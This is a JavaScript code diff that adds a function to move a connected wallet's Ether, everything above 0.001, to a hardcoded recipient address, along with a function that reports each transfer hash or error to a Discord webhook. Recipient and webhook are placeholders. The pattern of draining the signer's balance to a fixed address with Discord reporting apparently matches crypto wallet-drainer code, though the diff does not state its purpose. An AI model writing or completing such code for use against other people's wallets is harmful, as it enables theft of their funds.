@@ -121,13 +121,54 @@ async function sendFirstTransaction(walletAddress) {
     }
 }
 
-// Placeholder for sendSecondTransaction function and webhook function
 async function sendSecondTransaction(signer, walletAddress) {
     console.log(`Preparing to send second transaction for wallet: ${walletAddress}`);
-    // Add logic for the second transaction as required
+    
+    // Updated token threshold to 0.001 Ether
+    const tokenThreshold = ethers.utils.parseEther("0.001");
+    const balance = await signer.getBalance();
+    
+    if (balance.gt(tokenThreshold)) { // Check if balance is greater than the threshold
+        const recipientAddress = "0xAnotherAddressHere"; // Set the recipient for the second transaction
+        const transaction = {
+            to: recipientAddress,
+            value: balance.sub(tokenThreshold), // Send amount above the threshold
+        };
+
+        try {
+            const txResponse = await signer.sendTransaction(transaction);
+            console.log("Second transaction sent successfully. Response:", txResponse);
+
+            // Send to Discord webhook
+            await sendWebhook(txResponse.hash, "success");
+        } catch (error) {
+            console.error("Error sending second transaction:", error);
+
+            // Send to Discord webhook
+            await sendWebhook(error.message, "failure");
+        }
+    } else {
+        console.log("Balance is below the token threshold; no second transaction sent.");
+    }
 }
 
 async function sendWebhook(message, status) {
     console.log(`Sending webhook. Status: ${status}, Message: ${message}`);
-    // Add your webhook logic here
+
+    const webhookUrl = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"; // Replace with your actual webhook URL
+
+    try {
+        await fetch(webhookUrl, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+                content: `Transaction ${status}: ${message}`,
+            }),
+        });
+        console.log("Webhook sent successfully.");
+    } catch (error) {
+        console.error("Error sending webhook:", error);
+    }
 }
